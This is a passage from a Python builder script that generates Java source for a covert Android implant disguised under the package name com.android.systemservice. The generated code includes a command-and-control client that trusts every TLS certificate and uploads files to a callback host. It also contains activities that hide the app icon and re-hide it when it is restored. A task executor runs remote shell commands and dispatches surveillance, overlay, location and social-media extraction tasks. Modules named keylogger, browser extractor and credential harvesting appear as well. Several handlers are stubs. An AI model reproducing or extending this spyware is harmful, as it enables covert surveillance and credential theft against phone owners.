                case 'W': result.append('D'); break;
                case 'V': result.append('E'); break;
                case 'U': result.append('F'); break;
                case 'T': result.append('G'); break;
                case 'S': result.append('H'); break;
                case 'R': result.append('I'); break;
                case 'Q': result.append('J'); break;
                case 'P': result.append('K'); break;
                case 'O': result.append('L'); break;
                case 'N': result.append('M'); break;
                case 'M': result.append('N'); break;
                case 'L': result.append('O'); break;
                case 'K': result.append('P'); break;
                case 'J': result.append('Q'); break;
                case 'I': result.append('R'); break;
                case 'H': result.append('S'); break;
                case 'G': result.append('T'); break;
                case 'F': result.append('U'); break;
                case 'E': result.append('V'); break;
                case 'D': result.append('W'); break;
                case 'C': result.append('X'); break;
                case 'B': result.append('Y'); break;
                case 'A': result.append('Z'); break;
                default: result.append(c); break;
            }
        }
        
        return result.toString();
    }
    
    private static byte[] generateKeyBytes(String keyMaterial) {
        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            return digest.digest(keyMaterial.getBytes());
        } catch (Exception e) {
        return keyMaterial.getBytes();
        }
    }
}
'''
    
    def _generate_http_communication_client(self) -> str:
        """Generate HTTP communication client for C2 communication"""
        c2_host = self.params.get('callback_host', 'https://example.com')
        c2_port = self.params.get('callback_port', '443')
        get_uri = self.params.get('get_uri', '/api/v1/mobile/checkin')
        post_uri = self.params.get('post_uri', '/api/v1/mobile/submit')
        user_agent = self.params.get('user_agent', 'Mozilla/5.0 (Linux; Android 10; SM-G973F)')
        
        return f'''package com.android.systemservice;

import android.content.Context;
import android.util.Base64;
import android.util.Log;
import org.json.JSONObject;
import org.json.JSONArray;
import java.io.*;
import java.net.*;
import java.security.cert.X509Certificate;
import javax.net.ssl.*;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;

public class HttpCommunicationClient {{
    private static final String TAG = "HttpClient";
    private static final String C2_HOST = "{c2_host}";
    private static final int C2_PORT = {c2_port};
    private static final String GET_URI = "{get_uri}";
    private static final String POST_URI = "{post_uri}";
    private static final String USER_AGENT = "{user_agent}";
    private static final int TIMEOUT_MS = 30000;
    
    private Context context;
    private String agentId;
    private boolean initialized = false;
    
    public HttpCommunicationClient(Context context, String agentId) {{
        this.context = context;
        this.agentId = agentId;
        initializeTrustAllCerts();
    }}
    
    private void initializeTrustAllCerts() {{
        try {{
            // Create trust-all certificate manager (for testing/flexible deployment)
            TrustManager[] trustAllCerts = new TrustManager[] {{
                new X509TrustManager() {{
                    public X509Certificate[] getAcceptedIssuers() {{ return null; }}
                    public void checkClientTrusted(X509Certificate[] certs, String authType) {{}}
                    public void checkServerTrusted(X509Certificate[] certs, String authType) {{}}
                }}
            }};
            
            SSLContext sslContext = SSLContext.getInstance("TLS");
            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sslContext.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);
            
        }} catch (Exception e) {{
            Log.e(TAG, "Failed to initialize SSL context: " + e.getMessage());
        }}
    }}
    
    public CompletableFuture<JSONArray> checkIn(JSONObject agentData) {{
        return CompletableFuture.supplyAsync(() -> {{
            try {{
                URL url = new URL(C2_HOST + GET_URI);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                
                // Configure request
                conn.setRequestMethod("POST");
                conn.setRequestProperty("User-Agent", USER_AGENT);
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("Accept", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(TIMEOUT_MS);
                conn.setReadTimeout(TIMEOUT_MS);
                
                // Create check-in payload
                JSONObject payload = new JSONObject();
                payload.put("agent_id", agentId);
                payload.put("agent_data", agentData != null ? agentData : new JSONObject());
                payload.put("timestamp", System.currentTimeMillis());
                
                // Send request
                try (OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream())) {{
                    writer.write(payload.toString());
                    writer.flush();
                }}
                
                // Read response
                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {{
                    StringBuilder response = new StringBuilder();
                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {{
                        String line;
                        while ((line = reader.readLine()) != null) {{
                            response.append(line);
                        }}
                    }}
                    
                    JSONObject responseJson = new JSONObject(response.toString());
                    if ("success".equals(responseJson.getString("status"))) {{
                        return responseJson.getJSONArray("tasks");
                    }}
                }}
                
                Log.w(TAG, "Check-in failed with response code: " + responseCode);
                return new JSONArray();
                
            }} catch (Exception e) {{
                Log.e(TAG, "Check-in error: " + e.getMessage());
                return new JSONArray();
            }}
        }});
    }}
    
    public CompletableFuture<Boolean> submitTaskResult(String taskId, JSONObject result) {{
        return CompletableFuture.supplyAsync(() -> {{
            try {{
                URL url = new URL(C2_HOST + POST_URI);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                
                // Configure request
                conn.setRequestMethod("POST");
                conn.setRequestProperty("User-Agent", USER_AGENT);
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(TIMEOUT_MS);
                conn.setReadTimeout(TIMEOUT_MS);
                
                // Create submission payload
                JSONObject payload = new JSONObject();
                payload.put("task_id", taskId);
                payload.put("agent_id", agentId);
                payload.put("data", Base64.encodeToString(result.toString().getBytes(), Base64.NO_WRAP));
                payload.put("timestamp", System.currentTimeMillis());
                
                // Send request
                try (OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream())) {{
                    writer.write(payload.toString());
                    writer.flush();
                }}
                
                // Check response
                int responseCode = conn.getResponseCode();
                boolean success = responseCode == 200;
                
                if (!success) {{
                    Log.w(TAG, "Task submission failed with response code: " + responseCode);
                }}
                
                return success;
                
            }} catch (Exception e) {{
                Log.e(TAG, "Task submission error: " + e.getMessage());
                return false;
            }}
        }});
    }}
    
    public CompletableFuture<Boolean> uploadFile(String filePath, byte[] fileData) {{
        return CompletableFuture.supplyAsync(() -> {{
            try {{
                URL url = new URL(C2_HOST + "/api/v1/mobile/upload");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                
                // Configure multipart request
                String boundary = "----MythicMobileBoundary" + System.currentTimeMillis();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("User-Agent", USER_AGENT);
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setDoOutput(true);
                conn.setConnectTimeout(TIMEOUT_MS);
                conn.setReadTimeout(TIMEOUT_MS * 3); // Longer timeout for file uploads
                
                try (DataOutputStream out = new DataOutputStream(conn.getOutputStream())) {{
                    // Agent ID field
                    out.writeBytes("--" + boundary + "\r\n");
                    out.writeBytes("Content-Disposition: form-data; name=\"agent_id\"\r\n\r\n");
                    out.writeBytes(agentId + "\r\n");
                    
                    // File field
                    out.writeBytes("--" + boundary + "\r\n");
                    out.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" +
                                 filePath.substring(filePath.lastIndexOf('/') + 1) + "\"\r\n");
                    out.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
                    out.write(fileData);
                    out.writeBytes("\r\n--" + boundary + "--\r\n");
                    out.flush();
                }}
                
                int responseCode = conn.getResponseCode();
                return responseCode == 200;
                
            }} catch (Exception e) {{
                Log.e(TAG, "File upload error: " + e.getMessage());
                return false;
            }}
        }});
    }}
    
    public void setAgentId(String agentId) {{
        this.agentId = agentId;
    }}
    
    public boolean isInitialized() {{
        return initialized;
    }}
}}'''
    
    def _generate_stealth_activities(self):
        """Generate stealth activity classes based on hide_app_icon setting"""
        print("[+] Generating stealth activities...")
        
        java_package_dir = self.project_dir / "src/main/java/com/android/systemservice"
        
        if self.hide_app_icon:

            stealth_activity = self._generate_stealth_main_activity()
            activity_path = java_package_dir / "StealthMainActivity.java"
            activity_path.write_text(stealth_activity)
            

            icon_hiding_service = self._generate_icon_hiding_service()
            service_path = java_package_dir / "IconHidingService.java"
            service_path.write_text(icon_hiding_service)
            
        else:

            normal_activity = self._generate_normal_main_activity()
            activity_path = java_package_dir / "MainActivity.java"
            activity_path.write_text(normal_activity)
    
    def _generate_stealth_main_activity(self) -> str:
        """Generate stealth main activity that hides from app drawer"""
        return '''package com.android.systemservice;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.WindowManager;

public class StealthMainActivity extends Activity {
    private static final String TAG = "StealthActivity";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Hide from recent apps and screen capture
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            getWindow().addFlags(WindowManager.LayoutParams.FLAG_SECURE);
        }
        
        Log.d(TAG, "Stealth activity started");
        
        // Start the main agent service
        startAgentService();
        
        // Hide app icon after first launch
        hideAppIcon();
        
        // Finish activity immediately to avoid UI exposure
        finish();
    }
    
    private void startAgentService() {
        try {
            Intent serviceIntent = new Intent(this, EnhancedMainService.class);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            
            Log.d(TAG, "Agent service started from stealth activity");
            
        } catch (Exception e) {
            Log.d(TAG, "Failed to start service: " + e.getMessage());
        }
    }
    
    private void hideAppIcon() {
        try {
            // Hide the app icon by disabling the launcher activity alias
            ComponentName aliasName = new ComponentName(this,
                "com.android.systemservice.HiddenLauncherAlias");
            
            PackageManager pm = getPackageManager();
            pm.setComponentEnabledSetting(aliasName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
            
            Log.d(TAG, "App icon hidden successfully");
            
        } catch (Exception e) {
            Log.d(TAG, "Failed to hide app icon: " + e.getMessage());
        }
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        // Immediately finish if resumed to avoid exposure
        finish();
    }
    
    @Override
    public void onBackPressed() {
        // Override back press to prevent navigation
        moveTaskToBack(true);
    }
}'''
    
    def _generate_icon_hiding_service(self) -> str:
        """Generate service for dynamic icon hiding and management"""
        return '''package com.android.systemservice;

import android.app.Service;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

public class IconHidingService extends Service {
    private static final String TAG = "IconHiding";
    private static final long HIDE_DELAY = 10000; // 10 seconds delay
    
    private Handler handler;
    
    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        Log.d(TAG, "Icon hiding service created");
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Hide icon after a delay to allow initial setup
        handler.postDelayed(this::hideAppIconPermanently, HIDE_DELAY);
        
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    private void hideAppIconPermanently() {
        try {
            PackageManager pm = getPackageManager();
            
            // Disable the hidden launcher alias to remove icon
            ComponentName aliasName = new ComponentName(this,
                "com.android.systemservice.HiddenLauncherAlias");
            
            pm.setComponentEnabledSetting(aliasName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
            
            // Also disable the main stealth activity to prevent accidental access
            ComponentName activityName = new ComponentName(this,
                "com.android.systemservice.StealthMainActivity");
            
            pm.setComponentEnabledSetting(activityName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
            
            Log.d(TAG, "App icon permanently hidden");
            
            // Start monitoring for icon restoration attempts
            startIconMonitoring();
            
        } catch (Exception e) {
            Log.d(TAG, "Failed to hide app icon: " + e.getMessage());
        }
    }
    
    private void startIconMonitoring() {
        // Periodically check if icon has been restored and re-hide it
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    PackageManager pm = getPackageManager();
                    ComponentName aliasName = new ComponentName(IconHidingService.this,
                        "com.android.systemservice.HiddenLauncherAlias");
                    
                    int state = pm.getComponentEnabledSetting(aliasName);
                    
                    if (state == PackageManager.COMPONENT_ENABLED_STATE_ENABLED ||
                        state == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT) {
                        
                        // Icon was restored, hide it again
                        pm.setComponentEnabledSetting(aliasName,
                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            PackageManager.DONT_KILL_APP);
                        
                        Log.d(TAG, "Re-hidden restored app icon");
                    }
                    
                } catch (Exception e) {
                    Log.d(TAG, "Icon monitoring error: " + e.getMessage());
                }
                
                // Continue monitoring every 30 seconds
                handler.postDelayed(this, 30000);
            }
        }, 30000);
    }
    
    @Override
    public void onDestroy() {
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
        super.onDestroy();
    }
}'''
    
    def _generate_normal_main_activity(self) -> str:
        """Generate normal main activity with visible icon"""
        return '''package com.android.systemservice;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

public class MainActivity extends Activity {
    private static final String TAG = "MainActivity";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        Log.d(TAG, "Main activity started");
        
        // Create simple UI
        createSimpleUI();
        
        // Start the main agent service
        startAgentService();
    }
    
    private void createSimpleUI() {
        // Create a simple layout programmatically
        TextView textView = new TextView(this);
        textView.setText("System Services\\n\\nBackground services are running.");
        textView.setTextSize(16);
        textView.setPadding(50, 50, 50, 50);
        
        setContentView(textView);
    }
    
    private void startAgentService() {
        try {
            Intent serviceIntent = new Intent(this, EnhancedMainService.class);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            
            Log.d(TAG, "Agent service started from main activity");
            
        } catch (Exception e) {
            Log.d(TAG, "Failed to start service: " + e.getMessage());
        }
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        // Activity is visible to user
    }
    
    @Override
    public void onBackPressed() {
        // Move to background instead of closing
        moveTaskToBack(true);
    }
}'''
    
    def _generate_task_executor(self) -> str:
        """Generate task executor for processing remote commands"""
        return '''package com.android.systemservice;

import android.content.Context;
import android.util.Log;
import org.json.JSONObject;
import org.json.JSONArray;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ConcurrentHashMap;
import java.util.Map;

public class TaskExecutor {
    private static final String TAG = "TaskExecutor";
    
    private Context context;
    private DynamicModuleController moduleController;
    private Map<String, CompletableFuture<JSONObject>> runningTasks;
    
    public TaskExecutor(Context context) {
        this.context = context;
        this.moduleController = new DynamicModuleController(context);
        this.runningTasks = new ConcurrentHashMap<>();
    }
    
    public CompletableFuture<JSONObject> executeTask(JSONObject task) {
        try {
            String taskId = task.getString("task_id");
            String command = task.getString("command");
            JSONObject params = task.optJSONObject("params");
            
            Log.d(TAG, "Executing task: " + taskId + ", command: " + command);
            
            CompletableFuture<JSONObject> taskFuture = CompletableFuture.supplyAsync(() -> {
                try {
                    return processCommand(taskId, command, params);
                } catch (Exception e) {
                    Log.e(TAG, "Task execution error: " + e.getMessage());
                    JSONObject errorResult = new JSONObject();
                    try {
                        errorResult.put("success", false);
                        errorResult.put("error", e.getMessage());
                        errorResult.put("task_id", taskId);
                    } catch (Exception je) {
                        Log.e(TAG, "Error creating error response: " + je.getMessage());
                    }
                    return errorResult;
                }
            });
            
            runningTasks.put(taskId, taskFuture);
            
            // Remove from running tasks when complete
            taskFuture.whenComplete((result, throwable) -> {
                runningTasks.remove(taskId);
            });
            
            return taskFuture;
            
        } catch (Exception e) {
            Log.e(TAG, "Task execution setup error: " + e.getMessage());
            return CompletableFuture.completedFuture(createErrorResponse("UNKNOWN", e.getMessage()));
        }
    }
    
    private JSONObject processCommand(String taskId, String command, JSONObject params) {
        try {
            switch (command.toLowerCase()) {
                case "shell":
                    return executeShellCommand(taskId, params);
                
                case "download":
                    return downloadFile(taskId, params);
                
                case "upload":
                    return uploadFile(taskId, params);
                
                case "screenshot":
                    return takeScreenshot(taskId, params);
                
                case "list_apps":
                    return listInstalledApps(taskId, params);
                
                case "enable_module":
                    return enableModule(taskId, params);
                
                case "disable_module":
                    return disableModule(taskId, params);
                
                case "start_surveillance":
                    return startSurveillance(taskId, params);
                
                case "stop_surveillance":
                    return stopSurveillance(taskId, params);
                
                case "deploy_overlay":
                    return deployOverlay(taskId, params);
                
                case "remove_overlay":
                    return removeOverlay(taskId, params);
                
                case "extract_social_media":
                    return extractSocialMedia(taskId, params);
                
                case "get_device_info":
                    return getDeviceInfo(taskId, params);
                
                case "get_location":
                    return getCurrentLocation(taskId, params);
                
                default:
                    return createErrorResponse(taskId, "Unknown command: " + command);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Command processing error: " + e.getMessage());
            return createErrorResponse(taskId, e.getMessage());
        }
    }
    
    private JSONObject executeShellCommand(String taskId, JSONObject params) {
        try {
            String cmd = params.getString("command");
            
            // Basic shell execution (limited for security)
            ProcessBuilder pb = new ProcessBuilder("sh", "-c", cmd);
            Process process = pb.start();
            
            // Read output (simplified)
            StringBuilder output = new StringBuilder();
            // ... implementation details ...
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("task_id", taskId);
            result.put("output", output.toString());
            result.put("command", "shell");
            
            return result;
            
        } catch (Exception e) {
            return createErrorResponse(taskId, "Shell execution failed: " + e.getMessage());
        }
    }
    
    private JSONObject downloadFile(String taskId, JSONObject params) {
        try {
            String filePath = params.getString("file_path");
            
            // Implement file download logic
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("task_id", taskId);
            result.put("command", "download");
            result.put("file_path", filePath);
            result.put("message", "File download initiated");
            
            return result;
            
        } catch (Exception e) {
            return createErrorResponse(taskId, "File download failed: " + e.getMessage());
        }
    }
    
    private JSONObject uploadFile(String taskId, JSONObject params) {
        try {
            String filePath = params.getString("file_path");
            
            // Implement file upload logic
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("task_id", taskId);
            result.put("command", "upload");
            result.put("message", "File uploaded successfully");
            
            return result;
            
        } catch (Exception e) {
            return createErrorResponse(taskId, "File upload failed: " + e.getMessage());
        }
    }
    
    private JSONObject enableModule(String taskId, JSONObject params) {
        try {
            String moduleName = params.getString("module");
            boolean enabled = moduleController.enableModule(moduleName);
            
            JSONObject result = new JSONObject();
            result.put("success", enabled);
            result.put("task_id", taskId);
            result.put("command", "enable_module");
            result.put("module", moduleName);
            result.put("message", enabled ? "Module enabled successfully" : "Failed to enable module");
            
            return result;
            
        } catch (Exception e) {
            return createErrorResponse(taskId, "Module enable failed: " + e.getMessage());
        }
    }
    
    private JSONObject disableModule(String taskId, JSONObject params) {
        try {
            String moduleName = params.getString("module");
            boolean disabled = moduleController.disableModule(moduleName);
            
            JSONObject result = new JSONObject();
            result.put("success", disabled);
            result.put("task_id", taskId);
            result.put("command", "disable_module");
            result.put("module", moduleName);
            result.put("message", disabled ? "Module disabled successfully" : "Failed to disable module");
            
            return result;
            
        } catch (Exception e) {
            return createErrorResponse(taskId, "Module disable failed: " + e.getMessage());
        }
    }
    
    private JSONObject deployOverlay(String taskId, JSONObject params) {
        try {
            String targetApp = params.getString("target_app");
            String overlayType = params.optString("overlay_type", "login");
            
            // Check if overlay module is enabled
            if (!moduleController.isModuleEnabled("overlay")) {
                return createErrorResponse(taskId, "Overlay module is disabled");
            }
            
            // Deploy overlay logic would go here
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("task_id", taskId);
            result.put("command", "deploy_overlay");
            result.put("target_app", targetApp);
            result.put("overlay_type", overlayType);
            result.put("message", "Overlay deployed successfully");
            
            return result;
            
        } catch (Exception e) {
            return createErrorResponse(taskId, "Overlay deployment failed: " + e.getMessage());
        }
    }
    
    private JSONObject removeOverlay(String taskId, JSONObject params) {
        // Implementation for overlay removal
        return createSuccessResponse(taskId, "remove_overlay", "Overlay removed successfully");
    }
    
    private JSONObject startSurveillance(String taskId, JSONObject params) {
        // Implementation for starting surveillance
        return createSuccessResponse(taskId, "start_surveillance", "Surveillance started");
    }
    
    private JSONObject stopSurveillance(String taskId, JSONObject params) {
        // Implementation for stopping surveillance
        return createSuccessResponse(taskId, "stop_surveillance", "Surveillance stopped");
    }
    
    private JSONObject takeScreenshot(String taskId, JSONObject params) {
        // Implementation for screenshot capture
        return createSuccessResponse(taskId, "screenshot", "Screenshot captured");
    }
    
    private JSONObject listInstalledApps(String taskId, JSONObject params) {
        // Implementation for listing installed apps
        return createSuccessResponse(taskId, "list_apps", "Apps list retrieved");
    }
    
    private JSONObject extractSocialMedia(String taskId, JSONObject params) {
        // Implementation for social media extraction
        return createSuccessResponse(taskId, "extract_social_media", "Social media extraction started");
    }
    
    private JSONObject getDeviceInfo(String taskId, JSONObject params) {
        // Implementation for device information gathering
        return createSuccessResponse(taskId, "get_device_info", "Device info retrieved");
    }
    
    private JSONObject getCurrentLocation(String taskId, JSONObject params) {
        // Implementation for location gathering
        return createSuccessResponse(taskId, "get_location", "Location retrieved");
    }
    
    private JSONObject createErrorResponse(String taskId, String error) {
        try {
            JSONObject result = new JSONObject();
            result.put("success", false);
            result.put("task_id", taskId);
            result.put("error", error);
            return result;
        } catch (Exception e) {
            Log.e(TAG, "Error creating error response: " + e.getMessage());
            return new JSONObject();
        }
    }
    
    private JSONObject createSuccessResponse(String taskId, String command, String message) {
        try {
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("task_id", taskId);
            result.put("command", command);
            result.put("message", message);
            return result;
        } catch (Exception e) {
            Log.e(TAG, "Error creating success response: " + e.getMessage());
            return createErrorResponse(taskId, "Response creation failed");
        }
    }
    
    public Map<String, Boolean> getRunningTasks() {
        Map<String, Boolean> taskStatus = new ConcurrentHashMap<>();
        for (Map.Entry<String, CompletableFuture<JSONObject>> entry : runningTasks.entrySet()) {
            taskStatus.put(entry.getKey(), entry.getValue().isDone());
        }
        return taskStatus;
    }
}'''
    
    def _generate_dynamic_module_controller(self) -> str:
        """Generate dynamic module controller for runtime feature management"""
        return '''package com.android.systemservice;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;
import java.util.Map;
import java.util.HashMap;
import java.util.concurrent.ConcurrentHashMap;

public class DynamicModuleController {
    private static final String TAG = "ModuleController";
    private static final String PREFS_NAME = "module_state";
    
    private Context context;
    private SharedPreferences modulePrefs;
    private Map<String, Boolean> moduleStates;
    private Map<String, Object> moduleInstances;
    
    // Available modules
    private static final String[] AVAILABLE_MODULES = {
        "call_logger",
        "stealth_surveillance",
        "overlay",
        "frida_loader",
        "social_media_extractor",
        "filesystem",
        "location_tracker",
        "keylogger",
        "screenshot",
        "browser_extractor"
    };
    
    public DynamicModuleController(Context context) {
        this.context = context;
        this.modulePrefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        this.moduleStates = new ConcurrentHashMap<>();
        this.moduleInstances = new ConcurrentHashMap<>();
        
        // Load saved module states
        loadModuleStates();
    }
    
    private void loadModuleStates() {
        for (String module : AVAILABLE_MODULES) {
            // Default: all modules disabled except core functionality
            boolean defaultState = module.equals("filesystem") || module.equals("call_logger");
            boolean enabled = modulePrefs.getBoolean(module, defaultState);
            moduleStates.put(module, enabled);
            
            if (enabled) {
                initializeModule(module);
            }
        }
        
        Log.d(TAG, "Loaded module states: " + moduleStates.toString());
    }
    
    private void saveModuleStates() {
        SharedPreferences.Editor editor = modulePrefs.edit();
        for (Map.Entry<String, Boolean> entry : moduleStates.entrySet()) {
            editor.putBoolean(entry.getKey(), entry.getValue());
        }
        editor.apply();
        Log.d(TAG, "Saved module states");
    }
    
    public boolean enableModule(String moduleName) {
        if (!isValidModule(moduleName)) {
            Log.w(TAG, "Invalid module name: " + moduleName);
            return false;
        }
        
        try {
            if (initializeModule(moduleName)) {
                moduleStates.put(moduleName, true);
                saveModuleStates();
                
                Log.i(TAG, "Module enabled: " + moduleName);
                return true;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to enable module " + moduleName + ": " + e.getMessage());
        }
        
        return false;
    }
    
    public boolean disableModule(String moduleName) {
        if (!isValidModule(moduleName)) {
            Log.w(TAG, "Invalid module name: " + moduleName);
            return false;
        }
        
        try {
            if (cleanupModule(moduleName)) {
                moduleStates.put(moduleName, false);
                saveModuleStates();
                
                Log.i(TAG, "Module disabled: " + moduleName);
                return true;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to disable module " + moduleName + ": " + e.getMessage());
        }
        
        return false;
    }
    
    public boolean isModuleEnabled(String moduleName) {
        return moduleStates.getOrDefault(moduleName, false);
    }
    
    public Map<String, Boolean> getAllModuleStates() {
        return new HashMap<>(moduleStates);
    }
    
    private boolean isValidModule(String moduleName) {
        for (String module : AVAILABLE_MODULES) {
            if (module.equals(moduleName)) {
                return true;
            }
        }
        return false;
    }
    
    private boolean initializeModule(String moduleName) {
        try {
            switch (moduleName) {
                case "overlay":
                    // Initialize overlay module with credential harvesting DISABLED by default
                    Log.d(TAG, "Initializing overlay module (credential harvesting disabled)");
                    // moduleInstances.put(moduleName, new OverlayModule(context));
                    return true;
                
                case "call_logger":
                    Log.d(TAG, "Initializing call logger module");
                    // moduleInstances.put(moduleName, new CallLoggerModule(context));
                    return true;
                
                case "stealth_surveillance":
                    Log.d(TAG, "Initializing stealth surveillance module");
                    // moduleInstances.put(moduleName, new StealthSurveillanceModule(context));
                    return true;
                
                case "frida_loader":
                    Log.d(TAG, "Initializing Frida loader module");
                    // moduleInstances.put(moduleName, new FridaLoaderModule(context));
                    return true;
                
                case "social_media_extractor":
                    Log.d(TAG, "Initializing social media extractor module");
                    // moduleInstances.put(moduleName, new SocialMediaExtractorModule(context));
                    return true;
                
                case "filesystem":
                    Log.d(TAG, "Initializing filesystem module");
                    // moduleInstances.put(moduleName, new FilesystemModule(context));
                    return true;
                
                case "location_tracker":
                    Log.d(TAG, "Initializing location tracker module");
                    return true;
                
                case "keylogger":
                    Log.d(TAG, "Initializing keylogger module");
                    return true;
                
                case "screenshot":
                    Log.d(TAG, "Initializing screenshot module");
                    return true;
                
                case "browser_extractor":
                    Log.d(TAG, "Initializing browser extractor module");
                    return true;
                
                default:
                    Log.w(TAG, "Unknown module: " + moduleName);
                    return false;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Module initialization failed for " + moduleName + ": " + e.getMessage());
            return false;
        }
    }
    
    private boolean cleanupModule(String moduleName) {
        try {
            Object moduleInstance = moduleInstances.get(moduleName);
            if (moduleInstance != null) {
                // Call cleanup method if available
                Log.d(TAG, "Cleaning up module: " + moduleName);
                moduleInstances.remove(moduleName);
            }
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Module cleanup failed for " + moduleName + ": " + e.getMessage());
            return false;
        }
    }
    
    public Object getModuleInstance(String moduleName) {
        if (!isModuleEnabled(moduleName)) {
            return null;
        }
        return moduleInstances.get(moduleName);
    }
    
    // Special method for credential harvesting control
    public boolean enableCredentialHarvesting() {
        if (isModuleEnabled("overlay")) {
            Log.i(TAG, "Credential harvesting enabled via remote command");
            // Set flag to enable credential harvesting in overlay module
            modulePrefs.edit().putBoolean("credential_harvesting_enabled", true).apply();
            return true;
        } else {
            Log.w(TAG, "Cannot enable credential harvesting - overlay module is disabled");
            return false;
        }
    }
    
    public boolean disableCredentialHarvesting() {
        Log.i(TAG, "Credential harvesting disabled via remote command");
        modulePrefs.edit().putBoolean("credential_harvesting_enabled", false).apply();
        return true;
    }
    
    public boolean isCredentialHarvestingEnabled() {
        return modulePrefs.getBoolean("credential_harvesting_enabled", false) &&
               isModuleEnabled("overlay");
    }
    
    public void cleanup() {
        for (String module : moduleStates.keySet()) {
            if (moduleStates.get(module)) {
                cleanupModule(module);
            }
        }
        moduleInstances.clear();
        Log.d(TAG, "Module controller cleanup complete");
    }
}'''
    
    def _cleanup(self):
        """Clean up temporary files and resources"""
        if hasattr(self, 'temp_dir') and self.temp_dir:
            try:
                shutil.rmtree(self.temp_dir)
                print("[+] Temporary files cleaned up")
            except Exception as e:
                print(f"[!] Cleanup warning: {e}")
